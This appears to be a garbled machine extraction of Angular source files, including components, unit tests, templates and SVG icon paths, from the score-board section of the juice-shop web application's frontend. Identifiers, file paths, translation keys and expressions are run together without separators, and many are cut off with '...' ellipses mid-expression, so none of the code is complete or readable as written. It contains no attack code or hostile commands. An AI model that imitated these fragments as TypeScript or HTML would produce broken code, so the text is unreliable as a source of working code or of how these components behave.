werCasedisable ... tring()disable ... oString'Safety Mode'disable ... y Mode'Safety Mode'INFO_DISABLED_CHALLENGES''INFO_D ... eOfEnv}'INFO_D ... LENGES'INFO_DISABLED_CHALLENGES{num: n ... eOfEnv}num: nu ... llengesenv: di ... seOfEnv'safety mode being turned on''INFO_D ... ed on'}{num: n ... ed on'}env:'sa ... ned on''safety ... ned on'safety mode being turned ontoggleShowDisabledChallengestoggleS ... enges()toggleS ... llengesfilterSettingshowDisabledChallengesfilterS ... = falsefilterS ... llengesshowDis ... llengesfilterS ... == truewarning-cardnumberOfDisabledChallenges > 0warning-actiontoggleShowDisabledChallenges()filterSetting.showDisabledChallenges == true{{ 'HIDE_DISABLED_CHALLENGES' | translate }}'HIDE_DISABLED_CHALLENGES''HIDE_D ... anslate'HIDE_D ... LENGES'HIDE_DISABLED_CHALLENGESfilterSetting.showDisabledChallenges == false{{ 'SHOW_DISABLED_CHALLENGES' | translate }}'SHOW_DISABLED_CHALLENGES''SHOW_D ... anslate'SHOW_D ... LENGES'SHOW_DISABLED_CHALLENGESdisabledBecauseOfEnv ==='Safety Mode'warning-text'INFO_DISABLED_CHALLENGES' | translate: {num: numberOfDisabledChallenges,env:'safety mode being turned on'}disabledBecauseOfEnv !=='Safety Mode''INFO_DISABLED_CHALLENGES' | translate: {num: numberOfDisabledChallenges, env: disabledBecauseOfEnv}warning-iconenv-icondisabledBecauseOfEnv === 'Windows''fab fa-' + disabledBecauseOfEnv.toString().toLowerCase()disabledBecauseOfEnv !== 'Windows''icon-' + disabledBecauseOfEnv.toString().toLowerCase()P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenges-unavailable-warning/challenges-unavailable-warning.component.spec.tsChallengesUnavailableWarningComponent'./challenges-unavailable-warning.component'DEFAULT_FILTER_SETTING'../../filter-settings/FilterSetting''ChallengesUnavailableWarningComponent''Docker''my name two''should properly calculate number of disabled challenges'ngOnChanges./challenges-unavailable-warning.component/challenges-unavailable-warningimport  ... etting''../../ ... etting'../../filter-settings/FilterSetting/filter-settings/FilterSettingDEFAULT ... SETTING[Transl ... Root()]component.challenges[\r\n     ...  as anydisable ... Docker'name: 'my name two'my name twodisabledEnv: nullcompone ... ETTING)compone ... Settingstructu ... ETTING)'should ... lenges'should properly calculate number of disabled challengescompone ... anges()compone ... Changesexpect( ... lenges)compone ... llengesexpect( ... ocker')expect( ... v).toBeexpect( ... eOfEnv)compone ... seOfEnvP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenges-unavailable-warning/challenges-unavailable-warning.component.tsOnChangesFilterSetting'challenges-unavailable-warning''./challenges-unavailable-warning.component.html''./challenges-unavailable-warning.component.scss'filterSettingChangedisabledOnWindowsnumberOfDisabledChallengesOnWindowsdisabledChallengestype OnChangestype En ... allengeselecto ... arning''challe ... arning'challenges-unavailable-warning./challenges-unavailable-warning.component.html./challenges-unavailable-warning.component.scsspublic  ... lenge[]EnrichedChallenge[]public  ... Settingpublic  ... ting>()new Eve ... ting>()public  ... ges = 0public  ... booleanpublic  ... ows = 0numberO ... Windowspublic  ...  }\r\n  }const d ... = null)disable ... = null)this.ch ... = null)this.ch ... .filterthis.challengesconst d ... ndows')disable ... ndows')disable ... .filterthis.nu ... .lengththis.nu ... llengesdisable ... .lengththis.nu ... ges > 0this.di ... bledEnvthis.di ... seOfEnvdisable ... bledEnvdisable ... nges[0]if (dis ... \r\n    }disable ... gth > 0this.di ...  = truethis.di ... Windowsthis.nu ... Windowspublic  ... g)\r\n  }{\r\n     ... g)\r\n  }const f ... \r\n    }filterS ... \r\n    }...stru ... etting)structu ... etting)this.filterSetting!this.f ... llengesthis.fi ... llengesthis.fi ... Settingthis.fi ... etting)this.fi ... ge.emitthis.fi ... gChangeP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/coding-challenge-progress-score-card'TITLE_CODING_CHALLENGES''TITLE_ ... LENGES'TITLE_CODING_CHALLENGESavailableCodingChallengesavailab ... llengessolvedCodingChallengessolvedC ... llengesscore-card[description]'TITLE_CODING_CHALLENGES' | translate[total][score][showAsPercentage]right-sideicon-group74850 0 74 85defsclippathclip0_2_635106var(--theme-text)clip-pathurl(#clip0_2_635)fill-ruleevenoddclip-ruleM52.4188 11.0416C27.6378 11.0416 7.54834 31.1311 7.54834 55.912C7.54834 80.693 27.6378 100.782 52.4188 100.782C77.1998 100.782 97.2892 80.693 97.2892 55.912C97.2892 31.1311 77.1998 11.0416 52.4188 11.0416ZM13.8093 55.912C13.8093 45.6722 17.8771 35.8517 25.1178 28.6111C32.3584 21.3704 42.1789 17.3026 52.4188 17.3026C62.6586 17.3026 72.4791 21.3704 79.7197 28.6111C86.9604 35.8517 91.0282 45.6722 91.0282 55.912C91.0282 66.1519 86.9604 75.9724 79.7197 83.213C72.4791 90.4537 62.6586 94.5215 52.4188 94.5215C42.1789 94.5215 32.3584 90.4537 25.1178 83.213C17.8771 75.9724 13.8093 66.1519 13.8093 55.912Zfill-opacity0.12M69.2371 41.1778C68.9506 40.8702 68.6049 40.6235 68.2209 40.4524C67.8369 40.2813 67.4224 40.1893 67.0021 40.1819C66.5817 40.1745 66.1642 40.2518 65.7744 40.4092C65.3846 40.5667 65.0305 40.801 64.7332 41.0983C64.436 41.3956 64.2016 41.7497 64.0442 42.1395C63.8867 42.5293 63.8094 42.9468 63.8168 43.3671C63.8242 43.7875 63.9162 44.202 64.0873 44.586C64.2584 44.97 64.5051 45.3156 64.8127 45.6022L65.5265 46.3201C68.3731 49.1668 70.2806 51.0785 71.512 52.698C72.6932 54.2424 72.9603 55.1439 72.9603 55.912C72.9603 56.68 72.6932 57.5816 71.512 59.1259C70.2806 60.7413 68.3731 62.6571 65.5265 65.5038L64.8127 66.2217C64.5051 66.5083 64.2584 66.8539 64.0873 67.2379C63.9162 67.6219 63.8242 68.0365 63.8168 68.4568C63.8094 68.8771 63.8867 69.2947 64.0442 69.6845C64.2016 70.0743 64.436 70.4284 64.7332 70.7256C65.0305 71.0229 65.3846 71.2572 65.7744 71.4147C66.1642 71.5721 66.5817 71.6495 67.0021 71.642C67.4224 71.6346 67.8369 71.5426 68.2209 71.3715C68.6049 71.2004 68.9506 70.9537 69.2371 70.6462L70.1095 69.778C72.76 67.1275 74.9722 64.9153 76.4915 62.9243C78.0944 60.8206 79.2213 58.6 79.2213 55.912C79.2213 53.2239 78.0944 51.0033 76.4915 48.8997C74.9722 46.9087 72.76 44.6964 70.1053 42.046L69.2371 41.1778ZM58.6269 32.7296C59.428 32.9448 60.1111 33.4692 60.5259 34.1877C60.9406 34.9062 61.0533 35.7599 60.8391 36.5613L50.0368 76.8821C49.9302 77.2792 49.7464 77.6515 49.4959 77.9776C49.2454 78.3037 48.9332 78.5772 48.577 78.7827C47.8576 79.1975 47.0029 79.3096 46.2009 79.0943C45.3988 78.879 44.7152 78.3539 44.3003 77.6345C43.8855 76.9152 43.7733 76.0605 43.9887 75.2584L54.791 34.9418C54.8975 34.5442 55.0814 34.1715 55.3321 33.845C55.5828 33.5186 55.8955 33.2447 56.2522 33.0393C56.6089 32.8338 57.0026 32.7007 57.4108 32.6475C57.819 32.5944 58.2336 32.6223 58.631 32.7296H58.6269ZM40.0192 41.1778C39.4322 40.5915 38.6366 40.2622 37.807 40.2622C36.9774 40.2622 36.1817 40.5915 35.5948 41.1778L34.7266 42.046C32.0719 44.6964 29.8597 46.9087 28.3404 48.8997C26.7375 51.0033 25.6147 53.2239 25.6147 55.912C25.6147 58.6 26.7417 60.8206 28.3404 62.9243C29.8597 64.9153 32.0719 67.1275 34.7266 69.778L35.5948 70.6462C36.1882 71.1991 36.9731 71.5002 37.7841 71.4859C38.5951 71.4716 39.3689 71.143 39.9425 70.5694C40.516 69.9959 40.8446 69.2221 40.8589 68.4111C40.8732 67.6001 40.5722 66.8152 40.0192 66.2217L39.3054 65.5038C36.4588 62.6571 34.5554 60.7454 33.3199 59.1259C32.1387 57.5816 31.8757 56.68 31.8757 55.912C31.8757 55.1439 32.1387 54.2424 33.3199 52.698C34.5554 51.0827 36.4588 49.1668 39.3054 46.3201L40.0234 45.6022C40.6096 45.0152 40.9389 44.2196 40.9389 43.39C40.9389 42.5604 40.6096 41.7647 40.0234 41.1778H40.0192ZP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component.spec.tsScoreCardComponent'../score-card/score-card.component'CodingChallengeProgressScoreCardComponent'./coding-challenge-progress-score-card.component''CodingChallengeProgressScoreCardComponent''../sco ... ponent'../score-card/score-card.component/score-card/score-card'./codi ... ponent'./coding-challenge-progress-score-card.component/coding-challenge-progress-score-cardCodingC ... mponent'Coding ... ponent'P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component.ts sum up the scores// sum up the scores multiply by 2 because each coding challenge has 2 parts (find it and fix it)// mult ... fix it)SimpleChanges'coding-challenge-progress-score-card''./coding-challenge-progress-score-card.component.html''./coding-challenge-progress-score-card.component.scss'allChallengesupdatedNumberOfSolvedChallengestype SimpleChanges'coding ... e-card'coding-challenge-progress-score-card'./codi ... t.html'./coding-challenge-progress-score-card.component.html'./codi ... t.scss'./coding-challenge-progress-score-card.component.scssthis.up ... enges()this.up ... llengesupdated ... llengesngOnCha ... ()\r\n  }private ...  2\r\n  }{\r\n     ...  2\r\n  }const a ... llenge)availab ... llenge)this.al ... llenge)this.al ... .filterthis.allChallenges(challe ... allengethis.so ... + b, 0)this.so ... llengesavailab ... + b, 0)availab ... .reduceavailab ... Status)availab ...    .map(challe ... eStatus(a, b) => a + ba + bthis.av ... gth * 2this.av ... llengesavailab ... gth * 2availab ... .lengthP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-overview-score-card/difficulty-overview-score-card.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-overview-score-card'TITLE_CHALLENGES_SOLVED''TITLE_ ... SOLVED'TITLE_CHALLENGES_SOLVEDtotalChallengessolvedChallengesdifficultySummaries'url(#solved-gradient-''url(#s ... y + ')''url(#s ... ficulty'url(#s ... dient-'url(#solved-gradient-difficu ... ficulty'solved-gradient-''solved ... ficultysolved-gradient-availableChallengesdifficu ... s === 0difficu ... llengesdifficu ... s !== 0'%'difficu ... 0 + '%'difficu ... s * 100'TITLE_CHALLENGES_SOLVED' | translate[showProgressBar]difficulties-groupdifficulty-containerlet difficulty of difficultySummaries{{ difficulty.solvedChallenges }}total-challenges{{ difficulty.availableChallenges }}star-containerstar-difficulty-label{{ difficulty.difficulty }}280 0 28 25lineargradientstop-colorvar(--theme-primary)<!-- has to be duplicated here to stop the gradient directly instead of doing a "gradual" transition -->var(--theme-accent)difficulty.availableChallenges === 00%P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-overview-score-card/difficulty-overview-score-card.component.spec.tsDifficultyOverviewScoreCardComponent'./difficulty-overview-score-card.component''DifficultyOverviewScoreCardComponent''difficultySummaries''should calculate difficulty summaries correctly for empty list of challenges'calculateDifficultySummaries'should calculate difficulty summaries''should calculate difficulty summaries for multiple difficulties''./diff ... ponent'./difficulty-overview-score-card.component/difficulty-overview-score-cardDifficu ... mponent'Diffic ... ponent'compone ... es = []describ ... )\r\n  })'diffic ... maries'it('sho ... \n    })should calculate difficulty summaries correctly for empty list of challengesexpect( ...      ])expect( ... es([]))Difficu ... ies([])Difficu ... mmariescalcula ... mmaries{ diffi ... es: 0 }difficulty: 1availab ... nges: 0solvedChallenges: 0difficulty: 2difficulty: 3difficulty: 4difficulty: 5difficulty: 6'should ... maries'should calculate difficulty summariesexpect( ...     ]))Difficu ...      ]){ diffi ...  as any{ diffi ... false }hasCodi ... : false{ diffi ... us: 1 }codingC ... atus: 1{ diffi ... es: 3 }availab ... nges: 4solvedChallenges: 3'should ... ulties'should calculate difficulty summaries for multiple difficulties{ diffi ... us: 0 }{ diffi ... us: 2 }codingC ... atus: 2{ diffi ... es: 7 }availab ... ges: 15solvedChallenges: 7{ diffi ... es: 1 }availab ... nges: 3solvedChallenges: 1P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-overview-score-card/difficulty-overview-score-card.component.ts interface doesn't work here// inte ... rk here eslint-disable-next-line @typescript-eslint/consistent-type-definitions// esli ... nitions includes hacking and coding challenges (both find it and fix it)// incl ... fix it)DifficultySummaryDifficultySummariesINITIAL_SUMMARIESReadonly'difficulty-overview-score-card''./difficulty-overview-score-card.component.html''./difficulty-overview-score-card.component.scss'solvedHackingChallengescodingScoresummariesLookup0 | 1 | ... | 5 | 6availab ...  numbersolvedC ...  numbertype Di ... ummary>Record< ... ummary>const I ... 0 }\r\n})INITIAL ... 0 }\r\n})Object. ... 0 }\r\n}){\r\n  1: ...  0 }\r\n}1: { di ... es: 0 }2: { di ... es: 0 }3: { di ... es: 0 }4: { di ... es: 0 }5: { di ... es: 0 }6: { di ... es: 0 }Readonl ... maries>'diffic ... e-card'difficulty-overview-score-card'./diff ... t.html'./difficulty-overview-score-card.component.html['./dif ... .scss']'./diff ... t.scss'./difficulty-overview-score-card.component.scsspublic  ...  }\r\n  ]DifficultySummary[]private ... re\r\n  }{\r\n     ... re\r\n  }const s ... .lengthsolvedH ... .lengthsolvedH ... llengesthis.al ... .lengththis.al ... solved)(challe ... .solvedconst c ... + b, 0)codingS ... + b, 0)this.di ... lenges)this.di ... mmariesDifficu ... lenges)this.to ... gth * 2this.totalChallengesthis.al ... gth * 2this.so ... ngScoresolvedH ... ngScorestatic  ... y)\r\n  }const s ... MARIES)summari ... MARIES)structu ... MARIES)const challengesummari ... ? 3 : 1summari ... llengessummari ... iculty]challen ... ? 3 : 1summari ... enges++summari ... tus : 0challen ... tus : 0return  ... iculty)Object. ... iculty)Object. ...   .sortObject. ... Lookup)(a, b)  ... ficultya.diffi ... ficultya.difficultyb.difficultyP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-stars/difficulty-stars.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-stars[].cons ... iculty)[].constructorlet _ of [].constructor(difficulty)0 0 14 13M6.56386 0.511963L8.10332 5.24992H13.0851L9.05475 8.17813L10.5942 12.9161L6.56386 9.98787L2.53352 12.9161L4.07297 8.17813L0.0426283 5.24992H5.02441L6.56386 0.511963ZP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/difficulty-stars/difficulty-stars.component.ts'difficulty-stars''./difficulty-stars.component.html''./difficulty-stars.component.scss'DifficultyStarsComponentexport  ...  | 6\r\n}class D ...  | 6\r\n}selecto ... -stars'./difficulty-stars.component.html/difficulty-stars./difficulty-stars.component.scssP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/category-filter/category-filter.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/category-filterP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/componentsP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settingsresetCategoryFilterresetCa ... ilter()isAllCategoriesSelected{ selec ... ted() }selecte ... ected()isAllCa ... ected()isAllCa ... electedavailableCategoriesisCategorySelected{ selec ... gory) }selecte ... tegory)isCateg ... tegory)toggleCategorySelectedtoggleC ... tegory)toggleC ... elected'CATEGORY_''CATEGO ... anslate'CATEGO ... IPTION''CATEGO ... in('_')CATEGORY_categor ... in('_')categor ... ').joincategor ... it(' ')categor ... ).splitcategor ... rCase()category.toUpperCaselet category of availableCategoriespill{ selected: isCategorySelected(category) }toggleCategorySelected(category)'CATEGORY_' + category.toUpperCase().split(' ').join('_') + '_DESCRIPTION' | translate{{ category }}pill selectedresetCategoryFilter(){ selected: isAllCategoriesSelected() }P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/category-filter/category-filter.component.spec.tsCategoryFilterComponent'./category-filter.component''src/app/score-board/types/EnrichedChallenge''CategoryFilterComponent''category-one''category-two''category-three'categories'should extract all categories from passed in challenges'getAvailableCategories'toggle should add and remove selected categories''reset should clear categories''./cate ... ponent'./category-filter.component/category-filterCategor ... mponent'src/ap ... llenge'src/app/score-board/types/EnrichedChallenge'Catego ... ponent'[Catego ... ponent]{ categ ... allenge{ categ ... -one' }categor ... ry-one'category-one{ categ ... -two' }categor ... ry-two'category-two{ categ ... hree' }categor ... -three'category-threecomponent.categoriesshould extract all categories from passed in challengesconst a ... lenges)availab ... lenges)Categor ... lenges)Categor ... egoriesgetAvai ... egoriesexpect( ... y-one')expect( ... gories)expect( ... y-two')expect( ... three')it('tog ... )\r\n  })'toggle ... gories'toggle should add and remove selected categoriescompone ... y-one')compone ... electedexpect( ... -one'))expect( ... es).not'reset  ... gories'reset should clear categoriescompone ... y-two')expect( ... cted())compone ... ected()compone ... ilter()compone ... yFilterP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/category-filter/category-filter.component.ts'../../../../types/EnrichedChallenge''../../../../filter-settings/FilterSetting''category-filter''./category-filter.component.html''./category-filter.component.scss'categoriesChangec../../../../types/EnrichedChallenge../../../../filter-settings/FilterSettingselecto ... filter'category-filter'./cate ... t.html'./category-filter.component.html['./cat ... .scss']'./cate ... t.scss'./category-filter.component.scsspublic  ... ring>()new Set<string>()allChal ... lenge[]categories: string[]categor ... ng[]>()new Eve ... ng[]>()ngOnIni ... s)\r\n  }this.av ... lenges)this.av ... egoriesngOnCha ... s)\r\n  }public  ... ))\r\n  }return  ... egory))new Set ... egory))allChal ... tegory)allChallenges.map(challe ... ategorypublic  ... s)\r\n  }this.is ... tegory)this.is ... electedthis.ca ... tegory)this.categoriesthis.ca ... .filter(c) =>  ... ategoryc !== categorythis.categories.pushthis.ca ... gories)this.ca ... ge.emitthis.ca ... sChangepublic  ... y)\r\n  }return  ... tegory)this.ca ... ncludespublic  ... 0)\r\n  }return  ...  === 0)(this.c ...  === 0)this.ca ... h === 0this.ca ... egoriesDEFAULT ... egoriesP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialoglocalBackupServicelocalBa ... .save()localBa ... ce.savelocalBa ... tem(0))localBa ... restore$event. ... item(0)$event. ... es.item$event.target.files$event.targetrestoreBackupFilerestore ... click()restore ... e.clickmat-flat-buttoncdkFocusInitial{{ "BTN_CLOSE" | translate }}"BTN_CLOSE"setting-groupsettingrestoreBackupFile.click()localBackupService.save()P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component.spec.tsScoreBoardAdditionalSettingsDialogComponent'./score-board-additional-settings-dialog.component''src/app/Services/local-backup.service''ScoreBoardAdditionalSettingsDialogComponent'./score-board-additional-settings-dialog.component/score-board-additional-settings-dialogScoreBo ... mponentsrc/app/Services/local-backup.servicesrc/app/Services/local-backup'ScoreB ... ponent'[ScoreB ... ponent]save: () => null() => nullrestore: () => nullfixture ... \r\n    )TestBed ... \r\n    )P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component.ts'score-board-additional-settings-dialog''./score-board-additional-settings-dialog.component.html''./score-board-additional-settings-dialog.component.scss'class S ... ) {}\r\n}selecto ... dialog''score- ... dialog'score-board-additional-settings-dialog'./scor ... t.html'./score-board-additional-settings-dialog.component.html['./sco ... .scss']'./scor ... t.scss'./score-board-additional-settings-dialog.component.scssP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/filter-settings.component.htmlsearchQueryfilterS ... chQueryonSearchQueryFilterChangeonSearc ... .value)onSearc ... rChange$event.target.valuedifficultiesfilterS ... cultiesonDifficultyFilterChangeonDiffi ... .value)onDiffi ... rChange$event.valuefilterS ... h === 0filterS ... .lengthfilterS ... h !== 0filterSetting.statusonStatusFilterChangeonStatu ... .value)filterSetting.tagsonTagFilterChangeonTagFi ... .value)reset()'LABEL_RESET_ALL_FILTERS''LABEL_ ... ILTERS'LABEL_RESET_ALL_FILTERScanBeReset'var(--theme-text-dark)'canBeRe ... -dark)'canBeReset()'var(-- ... -dark)'var(--theme-text-dark)(--theme-text-dark)--theme-text-darkopenAdditionalSettingsDialogopenAdd ... ialog()openAdd ... sDialog'Open additional settings dialog''Open a ... dialog'Open additional settings dialogfilterS ... egoriesonCategoryFilterChangeonCateg ... $event)onCateg ... rChange[categories]filterSetting.categories(categoriesChange)onCategoryFilterChange($event)[allChallenges]filter-rowoptions-groupadditional-settings-wrapperadditional-settings-buttonopenAdditionalSettingsDialog()reset-filters-labelreset-filtersreset all filters'LABEL_RESET_ALL_FILTERS' | translateM1.63922 0.574219L0.574219 1.63172L7.03172 8.21672V12.7167C7.03172 13.1292 7.36922 13.4667 7.78172 13.4667H9.28172C9.69422 13.4667 10.0317 13.1292 10.0317 12.7167V11.0892L14.3667 15.4242L15.4242 14.3667L1.63922 0.574219ZcurrentColorM12.2442 2.96672L9.56672 6.37922L10.6392 7.45172C11.4117 6.46922 14.3742 2.67422 14.3742 2.67422C14.7567 2.17922 14.4042 1.46672 13.7817 1.46672H4.65422L6.15422 2.96672H12.2442Z<!-- inlined svg icon as the "filter_alt_off" isn't included in our icons. -->(selectionChange)onTagFilterChange($event.value)let tag of tagsAllonStatusFilterChange($event.value){{ 'STATUS_SOLVED' | translate }}partially-solved{{ 'STATUS_PARTIALLY_SOLVED' | translate }}'STATUS_PARTIALLY_SOLVED''STATUS ... SOLVED'STATUS_PARTIALLY_SOLVEDunsolved{{ 'STATUS_UNSOLVED' | translate }}{{ 'STATUS_ALL' | translate }}'STATUS_ALL'STATUS_ALLfilterSetting.difficultiesonDifficultyFilterChange($event.value)mat-select-triggerfilterSetting.difficulties.length !== 0{{ filterSetting.difficulties | difficultySelectionSummary }}difficultySelectionSummaryfilterS ... Summarydifficu ... SummaryfilterSetting.difficulties.length === 0{{ "LABEL_DIFFICULTY" | translate }}"LABEL_DIFFICULTY"LABEL_DIFFICULTYsearch-form-fieldfilterSetting.searchQuery(input)onSearchQueryFilterChange($event.target.value)matPrefixsearch-iconP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/filter-settings.component.spec.tsFilterSettingsComponent'./filter-settings.component''./components/category-filter/category-filter.component'DifficultySelectionSummaryPipe'./pipes/difficulty-selection-summary.pipe''FilterSettingsComponent''./filt ... ponent'./filter-settings.component/filter-settingsFilterS ... mponent./components/category-filter/category-filter.component/components/category-filter/category-filterimport  ... y.pipe''./pipe ... y.pipe'./pipes/difficulty-selection-summary.pipe/pipes/difficulty-selection-summaryDifficu ... aryPipe'Filter ... ponent'compone ... TTING }{ ...DE ... TTING }...DEFA ... SETTINGP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/filter-settings.component.ts'./components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component''filter-settings''./filter-settings.component.html''./filter-settings.component.scss'flatMapfilterSettingCopy'solved''unsolved'./components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component/components/score-board-additional-settings-dialog/score-board-additional-settings-dialogselecto ... ttings'filter-settings'./filt ... t.html'./filter-settings.component.html['./fil ... .scss']'./filt ... t.scss'./filter-settings.component.scss() => voidconstru ... og) { }ngOnCha ... ))\r\n  }this.ta ... gList))this.tagsnew Set ... gList))this.al ... agList)this.al ... flatMap(challe ... tagListonDiffi ... y)\r\n  }Array<1 ...  5 | 6>const f ... etting)filterS ... etting)this.fi ... ngCopy)onStatu ... y)\r\n  }'solved ...  | nullfilterS ...  statusfilterS ... .statusonTagFi ... y)\r\n  }filterS ...  = tagsfilterS ... py.tagsonCateg ... y)\r\n  }onSearc ... y)\r\n  }public  ... es\r\n  }return  ... llengesthis.fi ... chQuerythis.fi ... gth > 0this.fi ... == nullthis.fi ... .lengththis.fi ... cultiesthis.fi ... .statusthis.fi ... ng.tagsthis.fi ... egories!!this. ... chQuery!this.f ... chQuerypublic  ... t)\r\n  }this.di ... ponent)P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/pipes/difficulty-selection-summary.pipe.spec.tsP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/pipes'./difficulty-selection-summary.pipe''DifficultySelectionSummaryPipe''should properly summarize selected difficulties''1, 3, 5''1 - 3, 5''1, 3 - 5''1 - 2, 4 - 6''1 - 6''./diff ... y.pipe'./difficulty-selection-summary.pipe/difficulty-selection-summary'Diffic ... ryPipe'let pip ... aryPipepipe: D ... aryPipepipe =  ... yPipe()new Dif ... yPipe()should properly summarize selected difficultiesexpect( ... rm([]))pipe.transform([])pipe.transformexpect( ... Be('1')expect( ... m([1]))pipe.transform([1])[1]expect( ...  3, 5')expect( ... 3, 5]))pipe.tr ...  3, 5])1, 3, 5[1, 2, 3, 5]1 - 3, 5expect( ... 3 - 5')expect( ... 4, 5]))pipe.tr ...  4, 5])[1, 3, 4, 5]1, 3 - 5expect( ... 4 - 6')expect( ... 5, 6]))pipe.tr ...  5, 6])[1, 2, 4, 5, 6]1 - 2, 4 - 6expect( ... 1 - 6')[1, 2, 3, 4, 5, 6]1 - 6P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/filter-settings/pipes/difficulty-selection-summary.pipe.tsPipePipeTransformsortBy'lodash-es/sortBy'DifficultyGroup'difficultySelectionSummary'pureselectedDifficultiessortedDifficultiesdifficultyGroupsbreakDifficultiesIntoNeighboringGroupsconvertDifficultyGroupsToStringcurrentGroup} - ${', 'type PipeTransformimport  ... sortBy'lodash-es/sortBystart: numberend: number@Pipe({ ... true })Pipe({  ... true })name: ' ... ummary''diffic ... ummary'pure: truetransfo ... s)\r\n  }if (sel ... \r\n    }selecte ... h === 0selecte ... .lengthreturn ''const s ... ulties)sortedD ... ulties)sortBy( ... ulties)const d ... ulties)difficu ... ulties)breakDi ... ulties)breakDi ... gGroupsreturn  ... Groups)convert ... Groups)convert ... oStringfunctio ... oups\r\n}DifficultyGroup[]{\r\n  co ... oups\r\n}const d ... [] = []difficu ... [] = []let cur ...  = nullcurrent ...  = nullfor (co ...  }\r\n  }const difficultyif (cur ... \r\n    }current ... == nullcurrent ... culty }{ start ... culty }start: difficultyend: difficultyif (dif ...       }difficu ... end + 1currentGroup.end + 1currentGroup.endcurrent ... ficultydifficu ... tGroup)difficu ... ps.pushreturn  ... yGroupsfunctio ... , ')\r\n}{\r\n  re ... , ')\r\n}return  ... n(', ')difficu ... n(', ')difficu ... }).joindifficu ... }\r\n  })difficultyGroups.mapgroup = ...  }\r\n  }if (gro ... \r\n    }group.s ... oup.endgroup.startgroup.endreturn  ... tring()group.s ... tring()group.start.toStringreturn  ... p.end}``${grou ... p.end}` - , P:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/hacking-challenge-progress-score-card'TITLE_HACKING_CHALLENGES'TITLE_HACKING_CHALLENGESallChallenges.length'TITLE_HACKING_CHALLENGES' | translate62690 0 62 69clip0_2_621url(#clip0_2_621)M51.875 72.6249H29.125M51.875 72.6249V40.7749C51.875 40.1715 51.6353 39.5929 51.2087 39.1662C50.782 38.7396 50.2034 38.4999 49.6 38.4999H31.4C30.7966 38.4999 30.218 38.7396 29.7913 39.1662C29.3647 39.5929 29.125 40.1715 29.125 40.7749V72.6249M51.875 72.6249H72.35C72.9534 72.6249 73.532 72.3852 73.9587 71.9586C74.3853 71.5319 74.625 70.9533 74.625 70.3499V61.6291C74.625 61.0257 74.3853 60.447 73.9587 60.0204C73.532 59.5937 72.9534 59.3541 72.35 59.3541H54.15C53.5466 59.3541 52.968 59.5937 52.5413 60.0204C52.1147 60.447 51.875 61.0257 51.875 61.6291V72.6249ZM29.125 72.6249V54.0457C29.125 53.4424 28.8853 52.8637 28.4587 52.4371C28.032 52.0104 27.4534 51.7707 26.85 51.7707H8.65C8.04663 51.7707 7.46798 52.0104 7.04133 52.4371C6.61469 52.8637 6.375 53.4424 6.375 54.0457V70.3499C6.375 70.9533 6.61469 71.5319 7.04133 71.9586C7.46798 72.3852 8.04663 72.6249 8.65 72.6249H29.125ZM35.9727 12.3867L39.4194 5.08015C39.5124 4.87128 39.664 4.69384 39.8558 4.56933C40.0476 4.44481 40.2713 4.37854 40.5 4.37854C40.7287 4.37854 40.9524 4.44481 41.1442 4.56933C41.336 4.69384 41.4876 4.87128 41.5806 5.08015L45.031 12.3867L52.7357 13.5659C53.7253 13.7176 54.1197 14.9916 53.403 15.7196L47.8293 21.4071L49.145 29.4378C49.3118 30.4691 48.2805 31.2578 47.3933 30.7687L40.5 26.977L33.6068 30.7687C32.7233 31.254 31.6882 30.4691 31.855 29.4378L33.1707 21.4071L27.597 15.7196C26.8765 14.9916 27.2747 13.7176 28.2605 13.5659L35.9727 12.3867Zstroke-opacitystroke-width5.6875stroke-linecapstroke-linejoinP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component.spec.tsHackingChallengeProgressScoreCardComponent'./hacking-challenge-progress-score-card.component''HackingChallengeProgressScoreCardComponent''./hack ... ponent'./hacking-challenge-progress-score-card.component/hacking-challenge-progress-score-cardHacking ... mponent'Hackin ... ponent'[ScoreC ... ponent]P:/My 